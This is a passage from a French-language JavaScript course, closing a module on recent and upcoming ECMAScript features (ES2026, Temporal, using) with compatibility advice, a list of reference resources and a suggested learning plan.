- **`Map` / `WeakMap` `getOrInsert()` et `getOrInsertComputed()`** : évitent le motif « si absent, créer » (module 9).

```javascript
const octets = new Uint8Array([72, 101, 108, 108, 111]);
console.log(octets.toBase64());   // 'SGVsbG8=' (si pris en charge par votre environnement)
console.log(Math.sumPrecise([0.1, 0.2, 0.3]));   // 0.6 (le résultat exact attendu)
```

#### ES2027 : en préparation

Deux propositions majeures ont déjà atteint le **stade 4** : **`Temporal`** (module 23) et la **gestion explicite des ressources** avec `using` / `await using` (module 19). Leur publication officielle est prévue dans ES2027 ; la prise en charge varie encore selon les moteurs, d'où la prudence et l'usage de polyfills ou de transpilation.

### 25.4 Utiliser les nouveautés en pratique

1. **Vérifiez la compatibilité** : MDN (tableau de compatibilité en bas de chaque page), caniuse.com, et la version de Node.js minimale de votre projet.
2. **Déclarez vos cibles** : une liste *browserslist* ou le champ `engines` de `package.json` ; l'outil de build adapte la syntaxe.
3. **Syntaxe vs API** : la **syntaxe** nouvelle (`?.`, `#privé`) se **transpile** ; une **API** nouvelle (`Object.groupBy`, `Temporal`) se **polyfille** (ajout de code) ou se garde derrière une détection de fonctionnalité.
4. **Détection de fonctionnalités** plutôt que détection de navigateur : `if (typeof Object.groupBy === 'function')`.
5. Adoptez les nouveautés **progressivement**, en commençant par celles qui suppriment le plus de code fragile (`??`, `?.`, méthodes non mutantes, `structuredClone`).

> **Note** : les listes de fonctionnalités par édition circulent avec des contradictions sur Internet. La source de référence est le tableau des **propositions terminées** de TC39 (github.com/tc39/proposals, fichier *finished-proposals*). Vérifiez toujours la compatibilité sur caniuse.com et MDN.

### Points clés du module 25

- Une édition d'ECMAScript paraît chaque année ; les fonctionnalités passent par les stades 0 à 4 de TC39.
- Les grandes étapes : ES2015 (refondation), ES2017 (`async/await`), ES2020 (`?.`, `??`), ES2022 (privés `#`), ES2023-2025 (non mutants, regroupement, itérateurs, `Set`).
- ES2026 est approuvée ; `Temporal` et `using` (stade 4) sont attendues dans ES2027.
- Vérifiez toujours la compatibilité et utilisez transpilation, polyfills et détection de fonctionnalités.

## Ressources pour progresser

- **MDN Web Docs (fr)** : developer.mozilla.org/fr/docs/Web/JavaScript : référence officielle et tutoriels.
- **javascript.info (fr)** : fr.javascript.info : cours progressif détaillé.
- **Spécification ECMA-262** : tc39.es/ecma262 ; propositions : github.com/tc39/proposals.
- **Compatibilité** : caniuse.com et les tableaux de compatibilité de MDN.
- **Guide d'origine** : plan « JavaScript — Guide complet » (ECMAScript 2026), dont ce document est le développement.

### Plan de progression suggéré

1. **Fondations (modules 1-7)** : syntaxe, variables, types, opérateurs, chaînes, nombres, contrôle de flux.
2. **Structures de données (8-11)** : tableaux, objets, `Map`, `Set`, `globalThis`, expressions régulières.
3. **Fonctions et abstractions (12-15)** : fonctions, fermetures, itérateurs, `eval`, erreurs, mode strict.
4. **Asynchronisme et réseau (16-17)** : promesses, `async` / `await`, `fetch`, JSON.
5. **Orienté objet et architecture (18-20)** : prototypes, classes, modules.
6. **Navigateur (21-23)** : DOM, événements, BOM, stockage, dates.
7. **Professionnalisation (24-25)** : outils, tests, TypeScript, veille sur le langage.

*Bon code !*
